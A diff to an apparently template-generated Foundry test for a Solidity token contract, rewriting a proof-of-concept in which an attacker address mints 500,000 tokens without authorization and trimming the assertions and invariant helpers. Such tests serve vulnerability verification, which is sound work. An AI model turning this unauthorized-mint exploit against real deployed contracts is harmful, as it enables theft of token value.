@@ -67,7 +67,8 @@ contract GorillaTest is Test {
         console.log("Before attack - Contract ETH:", contractEthBefore);
         
         // 模板变量注入点 - 具体的漏洞测试逻辑
-        vm.prank(attacker); token.mint(attacker, 1_000_000 * 10**token.decimals());
+        vm.prank(attacker);
+        token.mint(attacker, 500000 * 10**18);
         
         // 记录攻击后状态
         uint256 attackerBalanceAfter = token.balanceOf(attacker);
@@ -79,7 +80,7 @@ contract GorillaTest is Test {
         console.log("After attack - Contract ETH:", contractEthAfter);
         
         // 模板变量注入点 - 漏洞验证断言
-        assertTrue(token.balanceOf(attacker) > 0, "Unauthorized mint detected"); // 检查未授权用户是否调用了mint; assertTrue(token.totalSupply() > initialTotalSupply, "Attack should increase total supply"); assertTrue(token.balanceOf(attacker) == mintedAmount, "Attacker balance should equal minted amount");
+        assertTrue(token.balanceOf(attacker) == attackerBalanceBefore + 500000 * 10**18, "Attacker minted tokens without authorization");
         
         console.log("=== Vulnerability Test Completed ===");
     }
@@ -142,27 +143,6 @@ contract GorillaTest is Test {
         console.log("User1 balance:", token.balanceOf(user1));
         console.log("User2 balance:", token.balanceOf(user2));
         console.log("Contract ETH balance:", address(token).balance);
-    }
-    
-    // 不变量检测辅助函数
-    function _sumAllBalances() internal view returns (uint256) {
-        return token.balanceOf(owner) + 
-               token.balanceOf(attacker) + 
-               token.balanceOf(victim) + 
-               token.balanceOf(user1) + 
-               token.balanceOf(user2);
-    }
-    
-    function _checkTotalSupplyInvariant() internal view returns (bool) {
-        return token.totalSupply() == _sumAllBalances();
-    }
-    
-    function _checkBalanceNonNegative() internal view returns (bool) {
-        return token.balanceOf(attacker) >= 0 && 
-               token.balanceOf(victim) >= 0 &&
-               token.balanceOf(owner) >= 0 &&
-               token.balanceOf(user1) >= 0 &&
-               token.balanceOf(user2) >= 0;
     }
 }
 
